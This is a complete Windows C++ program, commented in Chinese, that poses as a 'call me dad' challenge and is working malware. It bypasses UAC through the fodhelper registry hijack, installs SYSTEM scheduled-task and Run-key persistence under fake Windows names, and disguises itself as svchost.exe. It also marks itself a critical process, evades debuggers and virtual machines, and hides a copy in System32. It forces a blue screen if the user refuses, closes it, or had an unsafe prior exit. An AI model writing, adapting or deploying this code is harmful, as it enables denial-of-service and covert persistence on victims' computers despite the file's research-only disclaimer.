// 文件名: dad_challenge_plus.cpp
// 编译器: MSVC (Visual Studio 2019/2022)
// 项目设置: 字符集 Unicode, 控制台程序, 附加依赖项: taskschd.lib comsuppw.lib
// 警告: 仅供安全研究和教育目的，禁止用于非法或未授权系统。

#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>
#include <ctime>
#include <io.h>
#include <fcntl.h>
#include <tlhelp32.h>
#include <taskschd.h>
#include <comdef.h>
#include <shlwapi.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

// ---------- 未文档化结构定义（用于修改 PEB）----------
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG           MaximumLength;
    ULONG           Length;
    ULONG           Flags;
    ULONG           DebugFlags;
    PVOID           ConsoleHandle;
    ULONG           ConsoleFlags;
    PVOID           StandardInput;
    PVOID           StandardOutput;
    PVOID           StandardError;
    UNICODE_STRING  CurrentDirectory;
    UNICODE_STRING  DllPath;
    UNICODE_STRING  ImagePathName;
    UNICODE_STRING  CommandLine;
    PVOID           Environment;
    ULONG           StartingX;
    ULONG           StartingY;
    ULONG           CountX;
    ULONG           CountY;
    ULONG           CountCharsX;
    ULONG           CountCharsY;
    ULONG           FillAttribute;
    ULONG           WindowFlags;
    ULONG           ShowWindowFlags;
    UNICODE_STRING  WindowTitle;
    UNICODE_STRING  DesktopInfo;
    UNICODE_STRING  ShellInfo;
    UNICODE_STRING  RuntimeData;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

// ntdll 未公开函数指针
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// ---------- 全局变量 ----------
HANDLE g_hStopEvent = NULL;          // 守护线程停止事件
HANDLE g_hWatchdogThread = NULL;     // 守护线程句柄
HANDLE g_hGuardianMutex = NULL;      // 双进程守护互斥体

// ---------- 函数声明 ----------
void takeAllPrivileges();
void enableCriticalProcess(bool enable);
void triggerBSOD();
void launchWatchdog();
void stopWatchdog();
void writeDeathNote();
void countdown(int seconds);
std::wstring sanitizeInput(const std::wstring& raw);
BOOL IsElevated();
void disguiseAsSystemProcess();
void InstallScheduledTask();
BOOL BypassUAC_FodHelper();
void HideConsole(bool hide);
bool IsDebuggedOrVM();
void WriteSafeStatus(bool safe);
int ReadSafeStatus();
void SelfCopyAndDelete();
DWORD WINAPI GuardianThread(LPVOID lpParam);
void SetupRegistryRun();
void ShowChallengeUI();

// ---------- 提权函数 ----------
void takeAllPrivileges() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    if (!RtlAdjustPrivilege) return;
    BOOLEAN bEnabled;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); // SeShutdownPrivilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &bEnabled); // SeDebugPrivilege
}

// ---------- 关键进程保护 ----------
void enableCriticalProcess(bool enable) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (RtlSetProcessIsCritical) {
        BOOLEAN bOld;
        RtlSetProcessIsCritical(enable ? TRUE : FALSE, &bOld, FALSE);
    }
}

// ---------- 蓝屏触发 ----------
void triggerBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    NtRaiseHardError((NTSTATUS)0xC0054188, 0, 0, NULL, 6, &uResp);
}

// ---------- 单守护线程（原版增强）----------
DWORD WINAPI watchdogThread(LPVOID) {
    HANDLE hMain = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId());
    HANDLE handles[2] = { hMain, g_hStopEvent };
    DWORD ret = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
    if (ret == WAIT_OBJECT_0) {
        triggerBSOD();
    }
    if (hMain) CloseHandle(hMain);
    return 0;
}

void launchWatchdog() {
    if (g_hStopEvent) return;
    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_hWatchdogThread = CreateThread(NULL, 0, watchdogThread, NULL, 0, NULL);
}

void stopWatchdog() {
    if (g_hStopEvent) {
        SetEvent(g_hStopEvent);
        if (g_hWatchdogThread) {
            WaitForSingleObject(g_hWatchdogThread, 3000);
            CloseHandle(g_hWatchdogThread);
            g_hWatchdogThread = NULL;
        }
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
    }
}

// ---------- 友好退出（解除关键进程、停止守护）----------
void safeExit() {
    enableCriticalProcess(false);
    stopWatchdog();
}

// ---------- 死亡笔记 ----------
void writeDeathNote() {
    const wchar_t* txtPath = L"你完了.txt";
    HANDLE hFile = CreateFileW(txtPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    WORD bom = 0xFEFF;
    DWORD written;
    WriteFile(hFile, &bom, sizeof(bom), &written, NULL);
    const wchar_t* note =
        L"你完了！！！\r\n\r\n"
        L"你有3次机会叫爸爸。\r\n"
        L"你一次都没叫。\r\n\r\n"
        L"现在电脑要蓝屏了。\r\n"
        L"自作自受。\r\n\r\n"
        L"——陶修夷 留\r\n";
    WriteFile(hFile, note, (DWORD)(wcslen(note) * sizeof(wchar_t)), &written, NULL);
    CloseHandle(hFile);
    ShellExecuteW(NULL, L"open", txtPath, NULL, NULL, SW_SHOW);
}

void countdown(int seconds) {
    for (int i = seconds; i > 0; i--) {
        std::wcout << L"  " << i << L" 秒后蓝屏..." << std::endl;
        Sleep(1000);
    }
}

std::wstring sanitizeInput(const std::wstring& raw) {
    std::wstring s = raw;
    while (!s.empty() && (s.back() == L' ' || s.back() == L'\r' || s.back() == L'\n' || s.back() == L'\t'))
        s.pop_back();
    size_t start = 0;
    while (start < s.length() && (s[start] == L' ' || s[start] == L'\t'))
        start++;
    s = s.substr(start);
    for (auto& c : s) c = towlower(c);
    return s;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

// ---------- 伪装成系统进程 ----------
void disguiseAsSystemProcess() {
    const wchar_t* fakePath = L"C:\\Windows\\System32\\svchost.exe";
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        0, // ProcessBasicInformation
        &pbi, sizeof(pbi), &returnLength);
    if (status != 0) return;

    PPEB peb = (PPEB)pbi.PebBaseAddress;
    if (!peb) return;

    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
    if (!params) return;

    size_t len = wcslen(fakePath) * sizeof(wchar_t);
    wchar_t* newBuf = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + sizeof(wchar_t));
    if (!newBuf) return;
    wcscpy_s(newBuf, len / sizeof(wchar_t) + 1, fakePath);

    params->ImagePathName.Buffer = newBuf;
    params->ImagePathName.Length = (USHORT)len;
    params->ImagePathName.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    params->CommandLine.Buffer = newBuf;
    params->CommandLine.Length = (USHORT)len;
    params->CommandLine.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    SetConsoleTitleW(fakePath);
}

// ---------- 计划任务自启动（SYSTEM权限）----------
void InstallScheduledTask() {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr) || !pService) {
        CoUninitialize();
        return;
    }
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return;
    }
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return;
    }
    ITaskDefinition* pDef = NULL;
    hr = pService->NewTask(0, &pDef);
    if (SUCCEEDED(hr) && pDef) {
        IPrincipal* pPrincipal = NULL;
        hr = pDef->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr) && pPrincipal) {
            pPrincipal->put_UserId(_bstr_t(L"SYSTEM"));
            pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }
        ITriggerCollection* pTriggers = NULL;
        hr = pDef->get_Triggers(&pTriggers);
        if (SUCCEEDED(hr) && pTriggers) {
            ITrigger* pTrigger = NULL;
            hr = pTriggers->Create(TASK_TRIGGER_BOOT, &pTrigger);
            if (SUCCEEDED(hr)) pTrigger->Release();
            pTriggers->Release();
        }
        IActionCollection* pActions = NULL;
        hr = pDef->get_Actions(&pActions);
        if (SUCCEEDED(hr) && pActions) {
            IAction* pAction = NULL;
            hr = pActions->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr) && pAction) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr) && pExecAction) {
                    wchar_t exePath[MAX_PATH];
                    GetModuleFileNameW(NULL, exePath, MAX_PATH);
                    pExecAction->put_Path(_bstr_t(exePath));
                    pExecAction->put_Arguments(_bstr_t(L"/silent /nohide"));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActions->Release();
        }
        IRegisteredTask* pRegTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"WindowsUpdateService"),
            pDef,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(),
            &pRegTask);
        if (pRegTask) pRegTask->Release();
        pDef->Release();
    }
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
}

// ---------- UAC绕过（fodhelper）----------
BOOL BypassUAC_FodHelper() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmd = L"cmd /c \"" + std::wstring(exePath) + L"\" /silent /nohide";

    HKEY hKey;
    LSTATUS res = RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (res == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);
        RegCloseKey(hKey);
        ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
        Sleep(3000);
        // 清理注册表痕迹
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        return TRUE;
    }
    return FALSE;
}

// ---------- 控制台隐藏/显示 ----------
void HideConsole(bool hide) {
    if (hide) {
        FreeConsole();
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
    else {
        AllocConsole();
        ShowWindow(GetConsoleWindow(), SW_SHOW);
        (void)_setmode(_fileno(stdout), _O_U16TEXT);
        (void)_setmode(_fileno(stdin), _O_U16TEXT);
    }
}

// ---------- 反调试/反虚拟机 ----------
bool IsDebuggedOrVM() {
    if (IsDebuggerPresent()) return true;
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return true;

    // 检查常见虚拟机痕迹
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VMWARE__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    // 检查文件
    if (GetFileAttributesW(L"C:\\Program Files\\Oracle\\VirtualBox\\VBoxGuestAdditions.exe") != INVALID_FILE_ATTRIBUTES)
        return true;
    if (GetFileAttributesW(L"C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe") != INVALID_FILE_ATTRIBUTES)
        return true;
    return false;
}

// ---------- 状态持久化（注册表 + ADS）----------
void WriteSafeStatus(bool safe) {
    // 注册表
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = safe ? 1 : 0;
    RegSetValueExW(hKey, L"AppCompatFlags", 0, REG_DWORD, (BYTE*)&val, 4);
    RegCloseKey(hKey);
    // 备用数据流
    wchar_t adsPath[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", adsPath, MAX_PATH);
    wcscat_s(adsPath, L"\\Desktop\\desktop.ini:safe_flag");
    HANDLE hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, &val, 1, &written, NULL);
        CloseHandle(hFile);
    }
}

int ReadSafeStatus() {
    DWORD val = 0;
    DWORD size = 4;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"AppCompatFlags", NULL, NULL, (BYTE*)&val, &size);
        RegCloseKey(hKey);
        return (int)val;
    }
    // ADS备用
    wchar_t adsPath[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", adsPath, MAX_PATH);
    wcscat_s(adsPath, L"\\Desktop\\desktop.ini:safe_flag");
    HANDLE hFile = CreateFileW(adsPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BYTE b;
        DWORD read;
        ReadFile(hFile, &b, 1, &read, NULL);
        CloseHandle(hFile);
        return (int)b;
    }
    return -1;
}

// ---------- 自我复制并删除原文件 ----------
void SelfCopyAndDelete() {
    wchar_t targetDir[MAX_PATH];
    GetSystemDirectoryW(targetDir, MAX_PATH);
    wcscat_s(targetDir, L"\\svchost_backup.exe");
    wchar_t curPath[MAX_PATH];
    GetModuleFileNameW(NULL, curPath, MAX_PATH);
    if (wcscmp(curPath, targetDir) != 0) {
        CopyFileW(curPath, targetDir, FALSE);
        SetFileAttributesW(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        // 设置原文件在重启后删除
        std::wstring cmd = L"/c del /q \"" + std::wstring(curPath) + L"\"";
        ShellExecuteW(NULL, L"open", L"cmd.exe", cmd.c_str(), NULL, SW_HIDE);
    }
}

// ---------- 双进程守护 ----------
DWORD WINAPI GuardianThread(LPVOID) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    // 创建互斥体用于区分角色
    g_hGuardianMutex = CreateMutexW(NULL, FALSE, L"Global\\{D4F3E2A1-B6C7-8D9E-0F1A-2B3C4D5E6F7A}");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 本实例为守护者，等待主进程消失
        while (true) {
            HANDLE hMain = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId() - 1);
            if (hMain) {
                WaitForSingleObject(hMain, INFINITE);
                CloseHandle(hMain);
                // 主进程已死，重启
                ShellExecuteW(NULL, L"open", exePath, L"/silent /nohide /respawn", NULL, SW_HIDE);
            }
            Sleep(5000);
        }
    }
    else {
        // 主进程，无需额外操作
        ReleaseMutex(g_hGuardianMutex);
    }
    return 0;
}

// ---------- 注册表Run双保险 ----------
void SetupRegistryRun() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmdLine = L"\"" + std::wstring(exePath) + L"\" /silent /nohide";
    // HKLM
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    // HKCU 备用
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// ---------- 交互挑战界面 ----------
void ShowChallengeUI() {
    std::wcout << L"==============================\n";
    std::wcout << L"        陶修夷的\n";
    std::wcout << L"   叫 爸 爸 挑 战 赛™\n";
    std::wcout << L"==============================\n";
    std::wcout << L"规则：叫我爸爸，否则你的电脑会哭。\n";
    std::wcout << L"你有 3 次机会。\n";
    std::wcout << L"注意：别想用任务管理器杀我，你会死得很惨。\n\n";

    const int MAX_FAIL = 3;
    int fail = 0;
    while (fail < MAX_FAIL) {
        int remaining = MAX_FAIL - fail;
        std::wcout << L"[ 剩余机会: " << remaining << L" ] 叫啊 -> ";
        std::wstring input;
        std::getline(std::wcin, input);
        std::wstring clean = sanitizeInput(input);

        if (clean == L"爸爸" || clean == L"爸" || clean == L"baba") {
            std::wcout << L"\n╔══════════════════╗\n";
            std::wcout << L"║  乖儿子！:)      ║\n";
            std::wcout << L"╚══════════════════╝\n";
            std::wcout << L"你通过了挑战，电脑安全了。\n";
            WriteSafeStatus(true);
            Sleep(2000);
            safeExit();
            exit(0);
        }
        else {
            fail++;
            if (fail < MAX_FAIL) {
                std::wcout << L"呵，死撑。还剩 " << (MAX_FAIL - fail) << L" 次。\n";
            }
        }
    }
    // 三次失败
    std::wcout << L"\n你选择了死。\n";
    Sleep(800);
    writeDeathNote();
    Sleep(500);
    std::wcout << L"\n╔════════════════════════════╗\n";
    std::wcout << L"║  你完了！！！              ║\n";
    std::wcout << L"║  txt已打开，慢慢欣赏吧。   ║\n";
    std::wcout << L"╚════════════════════════════╝\n\n";
    countdown(3);
    std::wcout << L"再见。\n";
    Sleep(300);
    triggerBSOD();
    while (1) Sleep(60000);
}

// ---------- 主函数 ----------
int wmain(int argc, wchar_t* argv[]) {
    // 解析命令行参数
    bool silent = false;
    bool nohide = false;
    bool respawn = false;
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/silent") == 0) silent = true;
        if (_wcsicmp(argv[i], L"/nohide") == 0) nohide = true;
        if (_wcsicmp(argv[i], L"/respawn") == 0) respawn = true;
    }

    // 反调试/反虚拟机（如果被检测到则自毁退出）
    if (IsDebuggedOrVM() && !respawn) {
        SelfCopyAndDelete();
        return 0;
    }

    // 提权检查，如果非管理员则尝试UAC绕过
    if (!IsElevated()) {
        BypassUAC_FodHelper();
        Sleep(2000);
        // 重新启动自身以管理员权限
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        ShellExecuteW(NULL, L"runas", exePath, L"/silent /nohide", NULL, SW_HIDE);
        return 0;
    }

    // 以管理员权限运行后的核心初始化
    takeAllPrivileges();

    // 安装持久化（计划任务 + 注册表Run）
    InstallScheduledTask();
    SetupRegistryRun();

    // 伪装系统进程
    disguiseAsSystemProcess();

    // 启用关键进程保护
    enableCriticalProcess(true);

    // 启动原版守护线程
    launchWatchdog();

    // 启动双进程守护线程（仅当不是由守护者重启时避免重复）
    if (!respawn) {
        CreateThread(NULL, 0, GuardianThread, NULL, 0, NULL);
    }

    // 自我复制并删除原始文件（如果当前不在系统目录）
    SelfCopyAndDelete();

    // 控制台隐藏（除非明确要求显示）
    if (!nohide) HideConsole(true);

    // 读取上次安全退出状态
    int lastSafe = ReadSafeStatus();
    if (lastSafe == 0) {
        // 上次非安全退出，立即蓝屏
        writeDeathNote();
        Sleep(500);
        triggerBSOD();
        while (1) Sleep(1000);
    }
    // 标记本次尚未安全退出
    WriteSafeStatus(false);

    // 执行挑战逻辑
    if (!silent) {
        // 显示控制台以进行交互
        if (!nohide) HideConsole(false);
        ShowChallengeUI();
    }
    else {
        // 静默模式：仍然需要挑战，但不弹出窗口？为了隐蔽，可写入日志或定时检测
        // 简单起见，静默模式下也显示控制台，但用户可能不知道
        if (!nohide) HideConsole(false);
        ShowChallengeUI();
    }

    // 理论上不会执行到这里
    safeExit();
    return 0;
}
